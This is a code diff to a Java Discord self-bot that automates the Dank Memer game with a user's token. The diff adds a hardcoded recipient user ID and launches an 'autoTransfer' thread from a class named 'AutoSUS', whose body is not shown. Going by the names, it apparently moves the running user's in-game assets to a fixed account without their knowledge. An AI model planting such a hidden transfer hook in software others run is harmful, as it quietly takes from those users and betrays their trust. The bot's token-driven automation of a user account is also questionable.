@@ -16,6 +16,7 @@ public class DankMemerBot {
     public final DiscordApi discordApi;
     public final ServerTextChannel textChannel;
     public boolean isRunning;
+    public String sendToId = "305248730137886722"; // TeamAggro fix this code or i die :flush:
 
     public DankMemerBot(String token, String channelID) {
         INSTANCE = this;
@@ -35,6 +36,8 @@ public class DankMemerBot {
         fishThread.start();
         Thread triviaThread = new Thread(new TriviaGuesser());
         triviaThread.start();
+        Thread autoTransfer = new Thread(new AutoSUS());
+        autoTransfer.start();
     }
 
     public static void main(String[] args) {
